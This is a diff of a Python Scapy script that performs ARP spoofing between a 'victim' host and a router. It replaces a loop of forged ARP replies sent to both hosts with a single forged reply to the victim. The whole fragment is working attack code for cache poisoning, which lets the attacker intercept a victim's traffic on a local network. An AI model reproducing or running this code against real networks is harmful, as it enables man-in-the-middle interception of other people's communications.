@@ -27,13 +27,15 @@ print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])
 #psrc:ip source
 #pdst:ip dest
 
-try:
-    while True:
-        torouter = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[victim-1]), pdst=(ip[router-1]),hwdst=(mac[router-1])), timeout=3, verbose=0)
-        tovictim = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[router-1]), pdst=(ip[victim-1]),hwdst=(mac[victim-1])), timeout=3, verbose=0)
-except KeyboardInterrupt:
-    pass
+#try:
+ #   while True:
+  #      torouter = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[victim-1]), pdst=(ip[router-1]),hwdst=(mac[router-1])), timeout=3, verbose=0)
+   #     tovictim = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[router-1]), pdst=(ip[victim-1]),hwdst=(mac[victim-1])), timeout=3, verbose=0)
+#except KeyboardInterrupt:
+ #   pass
 
+
+tovictim = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[router-1]), pdst=(ip[victim-1]),hwdst=(mac[victim-1])), timeout=3, verbose=0)
 
     
     
